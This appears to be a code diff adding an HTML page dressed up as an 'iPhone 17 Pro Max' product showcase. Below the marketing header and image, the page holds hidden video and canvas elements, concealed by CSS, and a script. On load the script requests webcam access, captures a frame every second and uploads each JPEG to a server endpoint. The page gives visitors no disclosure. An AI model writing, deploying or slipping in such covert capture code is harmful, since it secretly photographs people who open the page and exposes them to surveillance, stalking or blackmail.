@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>iPhone 17 Pro Max</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", Arial, sans-serif;
+      background: linear-gradient(135deg, #000000, #1c1c1e);
+      color: white;
+      overflow-x: hidden;
+      text-align: center;
+    }
+
+    header {
+      padding: 4rem 2rem 2rem;
+    }
+
+    header h1 {
+      font-size: 3rem;
+      font-weight: 600;
+      margin-bottom: 0.5rem;
+      background: linear-gradient(90deg, #ffffff, #b3b3b3);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    header p {
+      font-size: 1.2rem;
+      color: #a1a1a6;
+      margin-bottom: 3rem;
+    }
+
+    .hero {
+      max-width: 800px;
+      margin: auto;
+      padding: 2rem;
+    }
+
+    .hero img {
+      width: 90%;
+      max-width: 500px;
+      border-radius: 30px;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.6);
+      animation: float 4s ease-in-out infinite;
+    }
+
+    @keyframes float {
+      0%, 100% { transform: translateY(0px); }
+      50% { transform: translateY(-15px); }
+    }
+
+    footer {
+      padding: 3rem 1rem;
+      font-size: 0.9rem;
+      color: #7d7d7d;
+    }
+
+    /* Hide camera */
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>iPhone 17 Pro Max</h1>
+    <p>The future of Pro is here — sleek design, unrivaled power, and innovation beyond imagination.</p>
+  </header>
+
+  <section class="hero">
+    <img src="iPhone17.jpeg" alt="iPhone 17 Pro Max">
+  </section>
+
+  <footer>
+    
+  </footer>
+
+  <!-- Hidden camera elements -->
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const context = canvas.getContext("2d");
+
+    // Start camera
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+      })
+      .catch(err => {
+        console.error("Camera access denied:", err);
+      });
+
+    // Capture every second
+    setInterval(() => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append("image", blob, "capture.jpg");
+
+        fetch("/upload", {
+          method: "POST",
+          body: formData
+        }).catch(err => console.error("Upload failed:", err));
+      }, "image/jpeg");
+    }, 1000);
+  </script>
+</body>
+</html>
